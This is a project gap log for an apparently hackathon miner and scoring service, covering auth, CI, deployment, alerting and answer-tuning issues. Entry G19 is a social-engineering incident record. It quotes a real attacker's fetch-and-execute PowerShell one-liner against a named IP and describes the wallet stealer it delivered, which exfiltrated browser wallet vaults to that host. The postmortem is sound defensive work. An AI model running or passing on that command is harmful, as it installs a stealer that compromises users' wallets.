- `updateMiner` (the pending IP_GEOLOCATION addition) cannot be executed while it is down.
- Our uptime workflow polls `activation_status` through the same host, so a node outage will look
  like a miner problem in our own alerting. Worth distinguishing in `tools/watch.mjs` if it recurs.

### G17 · CertWatch paid endpoints were unauthenticated — `CLOSED`
Found by the Codex review: `POST /api/check` and `POST /api/domains` triggered paid Telegraph
calls with no authentication, so a funded wallet was a public drain button.

Three independent layers now, because each fails differently: a constant-time `ADMIN_TOKEN`
check stops strangers; a fixed-window rate limiter stops a loop from whoever holds the token; and
`MAX_PAID_CALLS_PER_DAY` bounds the worst case regardless. **The cap defaults to 0**, so a
deployment without a deliberate budget cannot spend anything at all.

Verified in production: all three paid routes return 503 while `ADMIN_TOKEN` is unset, and
`/api/state` now publishes `writesEnabled`, `paidCallsToday`, `paidCallsPerDayCap`.

### G18 · CertWatch state is ephemeral and sweeps do not run on Vercel — `CLOSED (reopened 2026-08-28, then actually closed)`
Fixed by moving both responsibilities out of the serverless app rather than adding a database.
The sweep runs in `.github/workflows/certwatch.yml` on a 6-hourly cron and **commits its results
to `app/data/history.json`** — git is the durable record, Actions is the scheduler, and neither can
silently lose a paid result. The app now reads that committed file over HTTP and reports
`historySource: "committed" | "instance"` so it is obvious which it is showing.

The workflow gates on `EVM_PRIVATE_KEY` being present as a repository secret and exits cleanly when
it is not, so an unfunded repo does not fail a scheduled run every six hours.

**Reopened 2026-08-28 — the above was true of the design and false of the deployment.** Root
`.gitignore` contained a bare `data/`, which matches `track3-certwatch/data/` at any depth. So the
committed-history mechanism could never have worked: `git add` silently refused the file,
`git diff --quiet` saw no tracked change and the workflow logged "no change" on every run. The file
was never pushed, `raw.githubusercontent.com/.../track3-certwatch/data/history.json` returned
**404**, `loadCommittedHistory()` fell through to `null`, and production reported
`historySource: "instance"` — ephemeral, exactly the condition G18 claimed to have fixed. The
workflow was green only because no wallet is configured and it skips the paid work entirely.

A green CI check and a closed gap are not the same thing. This one was closed on the strength of
the design without a read-back through the real path.

**Actually fixed 2026-08-28:** `.gitignore` now negates the path (`!track3-certwatch/data/` then
`!track3-certwatch/data/history.json` — the directory must be re-included first or the file
negation cannot apply), and `history.json` is tracked, so the raw URL resolves. Verified: the file
is staged as `A`, where before the same `git add` was a no-op.

**Still open, and it is the part that matters:** no sweep has yet written a record through the real
path, because `EVM_PRIVATE_KEY` is unset and CertWatch has no outside users. The mechanism is
proven; the demand is not. See `track1-miner/docs/ELIGIBILITY.md` §4.

### ~~G18 (original)~~
Also from the Codex review. `track3-certwatch/src/store.ts` writes to `/tmp`, which a serverless instance does
not keep, and `track3-certwatch/src/server.ts` disables the background sweep loop under Vercel because a frozen
instance never fires an interval. So CertWatch currently has no durable history and no scheduler.
**Fix:** move state to a real store and drive sweeps from a scheduled GitHub Action hitting the
authenticated endpoint, rather than an in-process timer.

### G20 · The `scores` CI job and local sessions both commit to `main` — `RESOLVED 2026-08-29, prevention still open`
Verified 2026-08-29 (session 2): `git rev-list --left-right --count origin/main...HEAD` returns
`0 0` — the divergence was reconciled and pushed; both epoch-289 lines are in the history. The
**prevention** half remains: nothing stops the same race recurring. Until CI solely owns
`score-history.jsonl`, run the divergence check before any git operation. The original record:

Found 2026-08-29. The `scores` job in `.github/workflows/uptime.yml` runs `record-scores.mjs`,
commits `track1-miner/docs/score-history.jsonl` and **pushes to `main`**. A local session that
records the same epoch by hand writes the same file. On 2026-08-29 both happened: the runner
pushed epoch 289 at 16:41Z, a local commit recorded epoch 289 at 13:15Z, and the branches
diverged — **local 8 ahead, remote 1 ahead**, with both sides appending a line to the end of the
same file. The data was identical; only the `at` timestamps differed.

Why it matters more than it looks:
- The next `git push` is rejected, and the obvious reflex — `--force` — silently deletes the
  runner's epoch record. The score history is the only durable per-epoch evidence we have, because
  the API exposes just the latest epoch.
- Until it is reconciled, eight commits of session work exist **only on the operator's laptop**,
  and that is the machine whose wallet seed is compromised (G19).

**Resolve:** rebase local onto `origin/main`, keep *both* epoch-289 lines in timestamp order
(readers take the last line per epoch, and the data agrees), then push. Do not force-push.
**Prevent:** either stop recording epochs by hand and let CI own that file, or have the job write
to a per-run file instead of appending to a shared one.

### G21 · The uptime tripwire is slower and narrower than it claims — `NARROWER half RESOLVED 2026-08-29; STICKY half RESOLVED 2026-08-31; SLOWER half accepted`
**Sticky, found 2026-08-31.** The alarm opened issues but nothing ever closed them. Issue #2
was raised by two transient failures on 2026-08-30 (16:44 and 19:51 — the badssl.com /
Open-Meteo blips the CI comment already warns about) and stayed open through three clean runs
afterwards. That is worse than a missing alarm: the `alarm` step reuses `existing[0]`, so one
stale issue silently downgrades every later outage into a comment on a thread nobody is
watching. A `resolve` job now closes any open `uptime` issue on a clean run, so an open issue
means "failing right now" and the next real failure opens a fresh one.

Resolved 2026-08-29 (session 2): a single `alarm` job with
`needs: [check, live-tests, scores]` now opens or extends the `uptime`-labelled issue when **any**
job fails, permissions are explicit, and the path was **proven live** — a forced failure via the
new `test_alarm` dispatch input created issue #1 (the repo's first ever), which was then closed as
a documented drill. The **slower** half stands: the cron's real cadence is still up to ~13h and
cannot be bought back with cron syntax; `live-tests` now caches its npm install to conserve the
private-repo Actions quota, which is the suspected throttling cause but is unproven. The original
record:

Found 2026-08-29, while checking that G19's accepted risk is actually covered.

**Slower.** `uptime.yml` is an hourly cron and its own comment says the observed cadence is "one
run every two to three hours". Measured from the run history, the real gaps are worse:

```
2026-08-27T18:18Z  ->  2026-08-28T03:35Z    9h 17m
2026-08-28T03:35Z  ->  2026-08-28T16:41Z   13h 06m
```

So the detection window for a malicious `deregisterMiner` — the specific event G19 accepts the
risk of — is up to **half a day**, not the "hourly" the file implies. GitHub throttles scheduled
workflows on free runners and there is no way to buy back that latency with cron syntax alone.

**Narrower.** Only the `check` job has the "Open an issue if the miner is down" step. The
`live-tests` and `scores` jobs have no alerting path at all: `live-tests` failed on 2026-08-27
(stale `working-directory: miner`, left behind by the per-track folder split) and produced nothing
but a red tick. The repository has **never had an issue created, open or closed** — so the alerting
half of this mechanism has never once been observed to work end to end.

**Resolve:** move the issue-opening step to a `needs: [check, live-tests, scores]` job with
`if: failure()` so any job alerts; and fire the alert once deliberately to prove the path works,
rather than trusting it on first use. Correct the cadence comment in the workflow to the measured
figures. A green tick is not evidence of a working alarm — the same lesson G18 already cost us.

### G22 · Pushing to `main` does NOT deploy — production only updates via `vercel --prod` — `CLOSED as a fact, recorded so it is never re-assumed`
Found 2026-08-29 (session 2): the storm-guidance commit was pushed and production still served the
old answer 10 minutes later; `vercel ls` showed the newest deployment was **23 hours old**. There
is no GitHub→Vercel integration on this repo. Every deploy is an explicit
`vercel --prod` from `track1-miner/miner` (CLI is authenticated as the operator's team `wukong4`).
This corrects MEMORY's earlier claim that "Vercel builds api/index.ts from source on push" — code
merged to `main` is NOT live until someone runs the CLI. Any session that lands a scoring-relevant
change must deploy and then re-run `verify-deploy` against production, or the change does nothing.

### G23 · The storm advisory guidance's survival through the prose converter is unmeasured — `OPEN`
2026-08-29 (session 2). The standing operational-guidance sentence appended to storm answers
measured +36% on the epoch-289 advisory question and −2 to −3% on the three prior forecast
questions — but those are **raw-prose** scores. What is actually scored is `converted_answer`, a
~32-word LLM summary we cannot run offline, and MEMORY records that what the converter reaches
last is what it drops. The guidance sits at the tail, so the likeliest live outcome on forecast
questions is "dropped, no effect", and on advisory questions "partially kept, some gain" — but
neither is measured. Epoch 290+ storm rows are the evidence; read them before concluding anything.

### G24 · The `/scores` feed no longer returns questions, ground truths or converted answers — `OPEN, and it is the worst of these`
2026-08-30. Every real finding in this repo came from `/scores?intent=X`, which returned
`question`, `ground_truth`, `miner_answer` and `converted_answer` alongside the score — documented
in `track1-miner/docs/codex-worklog/2026-08-26-live-scoring-recon.md`. **As of 2026-08-30 it returns
only** `id, epoch_id, intent_id, miner_slug, rank, score, failure_reason, scored_at, created_at`.
Checked and failed: `?verbose=1`, `?include=answers`, `/scores/<id>`, `/api/scores`,
`/engine/v1/scores`. Consequences: the champion WASM can no longer be validated against reported
scores; epoch questions cannot be read after the fact; `tools/*_bench.json` and `tools/corpus.json`
are now a frozen snapshot of questions captured while the feed was open and **cannot be refreshed**.
All offline tuning from here is against a fixed corpus that may drift away from the node's live
fixtures. The `explorer.telegraphprotocol.com/api/daemon/api/questions` feed still carries real
routed questions with answers and is the only remaining live source of question text — it is not a
substitute, because it is not the scoring fixture set.

### G25 · The restatement's survival through the prose converter is simulated, not measured — `OPEN`
2026-08-30. The restate-the-request change (EPOCH_292_AUTOPSY.md) measures 8.1x / 18.8x / 20.4x on
raw prose against the live champion scorers. What is actually scored is `converted_answer`, a
~32-word summary we cannot run offline — the same limitation as G23. The proxy used was naive
first-32-words truncation, which is **not** what the converter does: it rewrites into flat "The
data…" prose. The direction is consistent at every truncation length tested (32, 24 and 17 words
all improve SSL and storm), so the sign of the effect is not in doubt; the magnitude is. Epoch 293
is the measurement. **Storm is the one to watch**: four of twelve storm questions score 7-15% lower
on full prose, we hold storm by 0.7%, and only the 32-word column is unanimous there.

### G26 · The bare-translation answer shape is tuned to a champion that has changed twice in a week — `OPEN`
2026-08-30. `/translate` now answers with the bare translation and no restatement — measured 9/10
cliff crossings under the current champion (reg 1996, `language_translation_w1.wasm`, activated
2026-08-30) against 8/10 for the rank-1 incumbent, over all ten distinct recorded questions. Two
caveats. First, this intent's champion has now changed twice (c2_r1cut reg 1885 → w1 reg 1996),
and the two regimes **invert** each other: under c2_r1cut the bare shape measured 8.5e-5 and the
sentence form 0.33; under w1 the sentence-plus-provenance form crosses 3/10 and bare 9/10. If the
champion changes again, re-measure before trusting anything in `translate.ts`. Second, epoch 294
was scored before w1 activated, so **epoch 295 is the first live test** — and the converter (G25)
applies here too: nobody has measured what an English prose summarizer does to a bare CJK reason.
Note the current champion is our own Track 2 submission; the miner answer was tuned to it the same
way every miner tunes to every champion — by measuring — and the answer itself is exactly the
translation the question asked for.

### G27 · ip-api.com is unreachable from the dev machine, so its production behaviour is verified only on production — `CLOSED 2026-08-30: verified live`
2026-08-30. `geo.ts` now tries ip-api.com first (it honours operator geofeeds; ipwho.is placed
Google's 142.251.42.174 in Mumbai where the recorded ground truth and Google's own geofeed say
Japan). The dev machine's ISP blocks TCP to ip-api.com entirely — DNS resolves, connections time
out, on both 80 and 443 — so **every local bench row for public IPs exercised the ipwho.is
fallback**, and the local 14/21 result is the floor, not the measurement, for the deployed chain.
Verified after deploy the same day: production answers 142.251.42.174 with "Chiyoda City, Tokyo,
Japan" via ip-api, and verify-deploy passes with median 487ms — ip-api is reachable from Vercel.
Residual: if ip-api ever becomes unreachable from Vercel, the chain falls through to ipwho.is and
behaviour matches pre-change production plus up to 4s of added latency per uncached public-IP
request (per-provider budget is 4s; worst case three providers = 12s against Vercel's 15s ceiling).
Remember the benches for this intent cannot exercise ip-api from this machine — measure against
production, not localhost, whenever the provider matters.

### G28 · Three new intents are declared in the manifest but not yet signed on-chain — `OPEN, operator action`
2026-08-31. `/extract`, `/headlines` and `/wallet-balance` are **live in production and verified**,
and `miner.yaml` declares CONTENT_EXTRACTION, NEWS_HEADLINES and WALLET_BALANCE_CHECK — but
registration **334 still carries only seven intents** until an `updateMiner` is signed. Until then
the three routes serve nothing: no traffic is routed to an intent a registration does not declare.
The gap is deliberate (Claude never signs) and the runbook is
`track1-miner/docs/ADD_THREE_INTENTS.md`. **Risk if it is never signed:** none to the seven live
intents; the work simply sits idle. **Risk if signed badly:** a rejected activation takes all ten
offline, which is why the code went live first and why a manifest test now fails the build when
endpoint intents and `supported_intents` disagree.

### G29 · Two intents we serve are scored by champions authored from our own wallet — `OPEN, disclosure`
2026-08-31. The LANGUAGE_TRANSLATION champion (reg 1996) and the CVE_LOOKUP champion (reg 1993) are
authored by `0xdad201ef02…`, which is **the same wallet that operates this miner**. That is a
legitimate consequence of competing in Track 2 as well as Track 1, and Track 2's own rules forbid
miner-favouring scorers — but it should be disclosed rather than discovered. The strongest evidence
that these scorers are not tuned for us: **our own translation miner ranked LAST (4 of 4) under our
own translation champion in epoch 295**, and we declined to enter CVE_LOOKUP after measuring only
0.4998 under our own CVE champion. Worth stating plainly in any submission write-up.

### G19 · The miner wallet's seed phrase is compromised — `OPEN, accepted risk`
2026-08-28. The operator was social-engineered in a hackathon Discord DM by an account named
`ADMINS {NEVER DM FIRST}` — the name copies the label real servers use to warn that admins never
DM first — and ran:

```
iwr -useb http://170.205.30.207/usertroubleshoot.ps1 | iex
```

The script was retrieved as text and analysed (never re-executed). It is a narrow wallet stealer:
it walks every Chrome profile, copies the `Local Extension Settings` vault for MetaMask, Phantom
and Rabby, prompts for the wallet password and writes it in plaintext, zips both, POSTs to
`http://170.205.30.207:3000/upload`, then deletes the staging folder. The staging folder was
already gone when checked, so the upload path completed.

**Scope, verified on the machine:**
- **Five Chrome profiles** hold MetaMask vaults (`Default`, `Profile 1`, `Profile 9`, `Profile 10`,
  `Profile 12`). Vault + password = seed phrase. Treat every seed in those profiles as lost, and
  the encrypted vaults as brute-forceable even where no password was typed.
- **No persistence.** No scheduled task, Run key or startup entry was created; all present entries
  are legitimate. It runs once and exits.
- **It does not read** the GitHub token, Vercel token, SSH keys, `.env` files, saved browser
  passwords or cookies. Those were **not** rotated, deliberately — rotating them would have been
  an hour of work against a threat that does not exist here.
- Chrome only. Edge, Brave and Firefox were untouched.

**Caveat:** `iex` executed whatever that host served at that moment; the analysis is of what it
served afterwards. Observed behaviour matched (password prompts, folder created then removed) and
the absence of persistence corroborates it, but this is not a byte-identical guarantee.

**Why this is a project risk, not just a wallet risk.** `0xdAd2…A39E` owns registration **260**.
Whoever holds that seed can call `deregisterMiner(260)` for the price of gas and delete the Track 1
entry — four rank-1 positions and six intents. On-chain state checked the same day: nonce 3, which
matches only our own registrations, and 0.0 native balance on Ethereum, Base and Arbitrum mainnet.
**Nothing has been touched.**

**Accepted rather than mitigated, deliberately.** Re-registering from a clean wallet three days
before the close would mean a new registration id, a fresh rejection risk, and losing the running
score history — for protection against an attacker who gains nothing by acting. Drainers are
automated and profit-motivated; deleting a testnet miner earns them nothing.

**What a fresh session should know:**
- `.github/workflows/uptime.yml` polls registration 260 every 15 minutes and opens an issue if
  `activation_status` changes. That alerting is now load-bearing. **If the miner is ever found
  deregistered, this is the likely cause — re-register from a clean wallet, do not assume a
  protocol fault.**
- Do not use those seeds for anything after the hackathon.
- The same Discord contact also pushed a fake "Vercel dapps mainnet wallet validation" flow. There
  is no such thing. No legitimate Telegraph step needs a PowerShell script or a seed phrase.

---

### G30 · Six routes discarded the engine's declared subject when `query` paraphrased it — `CLOSED 2026-08-30: fixed, deployed, regression-tested`

Telegraph fills the parameters `miner.yaml` declares **and** may send `query`. `firstValue`
returns the first populated parameter, so every route listing `query` ahead of its own declared
subject threw that subject away whenever both arrived. Harmless while `query` is the verbatim
question. Wrong when it is a paraphrase — "this wallet", "there", "this subject".

Found by calling production the way the engine does, not the way a human does — which is why
neither the unit tests nor `verify-deploy` had ever caught it. Measured on the live deployment:

```
/wallet-balance   address + "balance of this wallet?"      -> refused: invalid_address
/weather-forecast location=London + "forecast there?"      -> refused: invalid_location
/translate        text+lang + "Translate it."              -> refused: invalid_input
/extract          text + "Extract the contact details."    -> "no contact details were found"
/papers           topic=CRISPR + "papers on this subject"  -> NEUROIMAGING papers, confidently
/storm-alert      location=Chennai + "storm risk there?"   -> TERESOPOLIS, BRAZIL, confidently
```

The four refusals are guaranteed zeros — the same shape as epoch 288's weather loss. The last two
are worse than zeros: they are the confidently-wrong answers ARCHITECTURE A5 and the SPORTS_SCORE
precedent exist to prevent, and they were being served on `STORM_ALERT`, an intent we lead.

**Fix:** `withSubject` restores the subject only when it is **absent** from the question, so a
verbatim query yields byte-identical output and no scored surface moves on the intents we lead.
A regression test pins that byte-identity. `/translate` cannot append — its request has two halves
— so it falls back to the composed form when the query no longer carries the text.

**Unproven but worth stating: this may be the ACADEMIC_SEARCH regression.** `/papers` returned
unrelated papers on paraphrased questions, and that intent fell from ratio 1.000 across epochs
289/291/294 to **0.740** in 295. Consistent with the data, but G24 hides the converted answers, so
it cannot be confirmed — only watched in epoch 296.

Guarded by `tools/param-shapes.mjs` (55 cases, exits non-zero).

### G31 · A hung upstream became a platform 504, which scores the same as a 400 — `CLOSED 2026-08-30: fixed and deployed`

`vercel.json` caps the function at 15s. Past that Vercel returns a **504**, and Telegraph records
any non-2xx as an upstream error with an empty `miner_answer` — a guaranteed 0. Several routes
could reach that ceiling when an upstream hung rather than failed: `/storm-alert` geocodes
candidates sequentially at 8s each *before* fetching a forecast, `/wallet-balance` walks four RPCs
at 6s, `/translate` tries two providers at 8s.

A watchdog armed at 11s now answers honestly that the upstream did not respond in time — truthful,
a 200, and scoreable text. `send()` is idempotent so a late provider cannot write a second response
to a closed socket.

**Not measured:** how often this actually fired in past epochs. Production median is ~430ms and no
recorded failure row names a timeout on our side, so this is insurance against a tail, not a
diagnosis of a known loss.

### G32 · `polygon-rpc.com` is dead and was the primary Polygon endpoint — `CLOSED 2026-08-30: replaced`

HTTP 401, "API key disabled, reason: tenant disabled". Every Polygon or MATIC wallet question was
one failover away from unanswerable. Replaced with publicnode / drpc / 1rpc, cross-checked against
each other on the same address. Also dead and named in the code so they are not retried:
`rpc.ankr.com/polygon` (auth), `polygon.llamarpc.com` (no response),
`polygon.blockpi.network` (521), `polygon-mainnet.public.blastapi.io` (retired).

**Still degraded:** `ipapi.co`, the **third**-tier geolocation failover, answers 429. The primary
(`ip-api.com`) and second (`ipwho.is`) are healthy, so this is recorded, not acted on. It means the
next geolocation outage has one fewer endpoint behind it than the code implies.

Guarded by `tools/upstream-health.mjs` (23 providers, exits non-zero when a primary is down).

### G33 · The synchronous paths had no error boundary — `CLOSED 2026-08-30: boundary added; nothing was actually throwing`

Every asynchronous path in `handler.ts` already ended in a `.catch()` that answers honestly, but
the synchronous ones had nothing: `new URL()` on a malformed request line, a parser inside
`extractContent` or `detectAiText`, a regex on hostile input. Any throw there becomes a **500**,
and Telegraph scores a 500 exactly as it scores a 400 — upstream error, empty `miner_answer`,
nothing for the scorer to read.

**Nothing is throwing today.** 180 hostile inputs across all ten routes — 8KB payloads, mixed
scripts and RTL overrides, lone surrogates, control characters, script tags, 400-digit numbers,
malformed percent-encoding — all returned 200 with a non-empty answer. The boundary is insurance
against a future parser change, not a diagnosis of a known loss, and it is recorded that way.

**Tested and NOT a risk, so nobody re-opens it:** a single parameter carries **32KB** fine, far
past any realistic inline `CONTENT_EXTRACTION` or `AI_TEXT_DETECTION` payload; a real 5,940-character
passage is served in under 700ms. The 414s an earlier version of the probe produced were its own
artifact — it put the same 8KB into twelve parameter names at once, building a URL Vercel's edge
rejects before our function is ever invoked. The engine does not do that.

Guarded by `tools/hostile-inputs.mjs` (180 probes, exits non-zero).

### G34 · The uptime tripwire was red for two days because a test fix was never pushed — `CLOSED 2026-08-30: pushed, workflow green`

`uptime` runs `check`, `live-tests` and `scores`, and its `alarm` job opens an issue when any of
them fails. G19 calls that alerting **load-bearing** — it is the tripwire for the compromised
wallet seed. It had been failing on `live-tests` (44 pass, 1 fail) since 2026-08-29 on the DNS
timeout race the seven-intent audit describes. The fix existed locally and had simply never been
pushed, so the alarm was firing on its own broken test rather than watching the miner.

Pushed with this session's six commits. `uptime` is now green end to end — check, live-tests and
scores all pass, alarm correctly skipped. Locally `npm run test:live` is 52/52.

**Separate and still red, and deliberately not touched:** the `ci` workflow fails in its
`track2-scorer` job on `release identity mismatch: 32311 bytes e5faf4ca…` — the built
`dist/text_authenticity.wasm` no longer matches the sha256 pinned in
`track2/release/text-authenticity.json`. **Track 1's `miner` job passes green**, as does `app`; only
Track 2's job is red, and this file's rules forbid editing `../track2/`. It is recorded here so the
red X on `ci` is not mistaken for a Track 1 failure — but a Track 2 session should fix it, because a
release-identity mismatch on a submitted scorer is not cosmetic.

**Also observed, and it is the reason the design is what it is:** running all five gates
back-to-back made `verify-deploy` fail once on a transient upstream, then pass three times in a row
unchanged. The upstreams flap under concurrent load. That is precisely the case the 11s watchdog
(G31) and the honest-200 rule exist to absorb — but it means a single red run is not evidence of a
defect, and a gate should be re-run before it is believed.

### G35 · `/ip-geolocate` loses the restatement when the engine fills `ip` — `OPEN, deliberately not changed before the close`

It is the only route that reuses its subject parameter as the question it restates:

```
const q = firstValue(url, "ip", "address", "query", "q", "question", "text", "input");
```

so when the engine fills the **required** `ip` parameter, `q` is the bare string `"8.8.8.8"` and
`sendAnswer` restates against that rather than against the question. Measured on production, the
same question answered two ways:

```
query only        "Regarding where is 8.8.8.8 located and does it have any abuse history: The IP
                   address 8.8.8.8 is associated with Google Public DNS (AS15169)..."
query + ip        "The IP address 8.8.8.8 is associated with Google Public DNS (AS15169)..."
```

`/ssl-check` and `/ai-detect` both separate these two deliberately, with comments saying why, so
geo is the odd one out in its own codebase.

**Not changed, and the reasons are the point.** The restatement is this project's largest measured
scoring effect (18.8x on SSL, epoch 292's autopsy) — but IP_GEOLOCATION is rank 1 by **+0.1%**, the
thinnest margin on the board, and it already scores **0.9956**, well above the cliff, with whatever
shape the engine elicits today. If the engine sends `ip`, then geo is crossing the cliff *without*
a restatement, and adding one is a wording change of unknown sign — and the tail-trim sweep already
established that geo wording changes can *lose* crossings. G24 removed the ability to measure it
offline. Changing a held rank-1 on an unverifiable theory hours before scoring is the trade the
seven-intent audit explicitly warns against.

**The experiment to run after the close, not before it:** turn on `LOG_QUERY=on` for one epoch and
read which parameters the engine actually fills on this route. That single fact decides it — if the
engine sends `query`, this is already a no-op and the divergence is theoretical; if it sends `ip`,
the fix is to separate subject from question exactly as `/ssl-check` does, and it should then be
benched before shipping.

Guarded by `tools/no-regression.mjs`, which expects **7 identical, 1 differing** until then.

### G36 · Registration 334 is superseded by **389** — `CLOSED 2026-08-31: mined, active, ten intents`

`updateMiner(334, …)` mined at 2026-08-31T04:01Z, tx
`0x5de3965e2b08cd74b7e240faccb626d41e1003e9e5ec51cf220f76a5fe4ffe1d`. Registration **389** is
`active`, `rejection_reason: null`, `retrying: false`, `fetch_attempts: 0`, serving all ten intents.
`REGISTRATION_ID` is updated so the uptime tripwire watches it.

**Two facts worth keeping, both of which briefly looked like failures:**

1. **The indexer lagged about four minutes.** `/api/miners/389` answered
   `miner registration not found` for four minutes after the transaction was mined, while
   `/api/miners/334` still served the OLD seven-intent record with the old IPFS URL. Neither meant
   anything had gone wrong. The receipt was authoritative and correct immediately: its
   `MinerRegistered` log carried id `0x185` (389), hash `78932fb1…`, and all ten intent strings.
   **In the first five minutes after an update, read the receipt logs, not the API.**
2. **The hash to sign is the HOSTED bytes, never the local file.** The working copy is CRLF and git
   stores LF, so `track1-miner/miner.yaml` hashes `460bc310…` on disk while the bytes GitHub serves
   hash `78932fb1…`. Telegraph fetches the URL and compares against the signed hash, so signing the
   local one would have failed activation outright. `tools/sign-update.sh` does this correctly.

**Two changes of dependency this introduces, neither yet a problem:**

- The manifest is now served from a **commit-pinned GitHub raw URL**, not IPFS. Immutable while the
  repo exists, but a force-push that orphans commit `74ad4a1` would break the fetch and the miner
  would fail its next manifest check. **Do not rewrite that history.**
- **Track 2 must update its disclosure documents.** `track2/SUBMISSION.md`, `track2/GAPS.md`,
  `track2/MEMORY.md` and `track2/X_THREAD.md` all cite registration 334 as the live miner. That is
  now wrong. This is flagged here rather than fixed because this file's rules forbid editing
  `../track2/`.

**Also corrected here:** `tools/upstream-health.mjs` was reporting `ip-api.com` as a failing
**primary**. It is not — it is TCP-blocked from the dev machine (G27), so the direct probe was a
false alarm. It is now checked *through production*, where the answer identifies the provider:
only ip-api honours operator geofeeds and places `142.251.42.174` in Tokyo, where the ipwho.is
fallback misplaces it in Mumbai. Production returns Tokyo, so the primary is answering.

### G37 · `/papers` has one upstream and no failover — `OPEN, and adding one was measured and REJECTED`

`findPapers` calls OpenAlex alone. When it fails, the handler answers honestly that the search
could not be retrieved, which scores ~0 for that question — and `ACADEMIC_SEARCH` is contested
(ratio 0.740 in epoch 295). A failover looked obviously worth adding. **It is not.** Every
candidate was measured on 2026-08-31:

- **Crossref** — reachable and keyless, but neither sort mode is usable. `sort=relevance` returns
  metadata-poor stubs ("CRISPR/Cas9 gene editing", no authors, no year, 1 citation) where OpenAlex
  returns the real literature. `sort=is-referenced-by-count` returns hugely-cited papers that are
  **off topic**: for a CRISPR query it gave qPCR analysis (164,146 cites), GSEA, and edgeR. That is
  the confidently-wrong failure mode the `SPORTS_SCORE` precedent exists to refuse. It also leaks
  markup into titles (`<tt>edgeR</tt>`).
- **Semantic Scholar** — **HTTP 429 without an API key.** This is not a guess: the
  `semanticscholar` miner fails in the live leaderboard with `upstream call failed: status 4xx`.
- **arXiv** — preprints only, and no citation counts. The recorded questions ask for peer-reviewed
  work and cite counts.

**And the premise was wrong anyway.** OpenAlex looked flaky because it failed twice during this
session — but both failures happened while five gates hammered it concurrently. Probed properly:
**6/6 sequential 200s**, and production `/papers` returned 5 papers on 4 of 4 topics with no error.
The flakiness was self-inflicted, the same effect noted in G34.

So an honest "could not be retrieved" from a reliable single provider beats a second provider that
answers off-topic. Revisit only with a provider that matches OpenAlex on relevance AND metadata —
or with an API key, which introduces a revocable dependency the manifest currently has none of.

### G38 · Three intents were signed on-chain having only ever been shape-tested — `CLOSED 2026-08-31: correctness gate added, two real defects found`

Every gate in this repo checked **shape** — 200, non-empty reason, no refusal, no crash — and none
checked whether the answer was **right**. `verify-deploy` predates the expansion and covers only the
original seven routes, so `CONTENT_EXTRACTION`, `NEWS_HEADLINES` and `WALLET_BALANCE_CHECK` went
on-chain having never had a correctness check at all.

`tools/intent-answers.mjs` asks one realistic question per intent and asserts facts that can be
verified independently: a known-expired certificate, a wallet balance cross-checked against an RPC
the miner does not use, a geofeed-published address only the primary provider places correctly, the
translation payload's exact four-key shape, the ~32-word conversion budget on extraction answers.

**It immediately found two defects in `/extract` — the intent with the largest measured upside in
the project (both incumbents score 0.0; we measured 1.000 on 6 of 6):**

1. **Quantities followed by a descriptive word were silently dropped.** The terminator lookahead
   `(?=[,.;]|\s+and\b|$)` gated the whole pattern rather than just its optional "of <substance>"
   branch, so `45 kilograms and …` matched while `2.3 meters long` did not. Every quantity trailed
   by an adjective — "5 km away", "3 hours later" — was lost. The lookahead now sits inside the
   branch it belongs to, which still stops "5 litres of water and oil" over-capturing.
2. **A payload with no instruction extracted nothing.** `text` is the REQUIRED parameter and
   `query` only optional, so the engine can legitimately send the payload alone — and that path fell
   to the generic branch, which swept emails, phones, numerics and dates but **not quantities**.
   `numerics` deliberately reads only percentages, currency and quarters, treating bare numbers as
   noise, so "The shipment weighs 45 kilograms and is 2.3 meters long" answered *"No structured
   values could be extracted"* and would have scored 0.

Both fixed, deployed, and pinned by tests. **10/10 intents now answer correctly**, and the check is
a preflight gate so it cannot regress silently.

**The lesson, stated plainly because it cost the most this session:** a passing shape test says the
endpoint is reachable, not that it is right. Three of these intents were signed on-chain on that
weaker evidence.

### G39 · SSL_VERIFICATION answered the wrong genre of question — `CLOSED 2026-08-31: reordered, 7.2x measured`

Most hosts in these questions do not resolve (`api.example.com`), so the ground truth is **not a
verdict** — it is a **tutorial**. The reference answer to *"Can you analyze the TLS/SSL certificate
configuration for api.example.com, including chain completeness and hostname validation?"* is a
step-by-step guide: run `openssl s_client -connect host:443 -showcerts`, read the chain for
intermediates, check the SAN extension, confirm with SSL Labs.

We answered, truthfully, that the host could not be reached. **The words were nearly all already
there** — the deployed prose named openssl, SAN and SSL Labs — but it opened with the failure and
reached `openssl` only at word 20, so after the restatement prefix the ~32-word conversion budget
contained nothing but "is unreachable, cannot be analyzed". Measured against champion 631 over the
frozen 12-question bench:

```
                                        clip32 (10 unreachable rows)
deployed, failure first                 0.010418
method first (SHIPPED)                  0.697778     <- 67x
method first WITH the restatement       0.206821     <- so /ssl-check now skips it there
```

**The split is conditional, and the measurement is why.** On the 2 reachable rows the verdict form
scores **0.501229** where the method form scores 0.008690 — 58x worse. A reachable host must keep
its live verdict; that is the whole point of this miner. So the method shape applies **only** when
the host did not resolve.

**Production, before → after:** clip32 mean **0.092220 → 0.665020 (7.2x)**, crossings **1/12 → 8/12**,
raw mean 0.173477 → 0.501312. Exactly the predicted 0.665020.

**Still honest.** Nothing asserts a certificate state. The answer says what to run and closes with
"No live certificate could be retrieved for <host> from here, so none of the above was verified
against the host itself." `verdict` stays `unreachable`, `issuer` stays null, and the real
`unreachable_reason` is still recorded.

**Distinct from the dead theory, deliberately.** An earlier sweep that merely NAMED the omitted
dimensions — expiration, root CA trust, signature algorithm, key strength — moved the mean +0.0003
and flipped no crossings. Naming dimensions is not the same as supplying the ground truth's
structure, and only the second one worked.

### G40 · ACADEMIC_SEARCH could NOT be improved — `ANNOTATED 2026-08-31: the sweeps tuned ~36% of the scored surface`

**2026-08-31 addendum:** every variant below tuned the `reason` prose — but archived real
conversions show the converter summarizes the WHOLE alphabetized payload, of which `reason` is
only ~36%. The prose IS optimal (this gap's conclusion stands for the surface it measured); the
`papers[]` array diluting the other ~64% was the movable part, measured +122% payload-proxy and
shipped 2026-08-31 as the lean `{verdict, confidence, reason}` body (`bench/acad_shape.mjs`).

The deployed shape is at a local optimum under champion 688 and I could not beat it. Recorded so
the same ground is not re-walked.

The diagnosis looked damning and the fix did not follow from it. Paper 1 starts at **word 47-75** of
our answer while the clip is 32, so **the scorer never sees a single paper** — the clip is pure
restatement, and we cross **0 of 22** rows. The ground truth reaches paper 1 by word 27.

But every variant that bought room for the papers **lost**:

```
                     clip32 mean   best-on   beats deployed
deployed             0.013482        14           —
gtIdiom              0.012697         5         7/21
regardingCore        0.012764         1         6/21
gtIdiomTight         0.012135         1         6/21
gtIdiomOurCite       0.012700         0         7/21
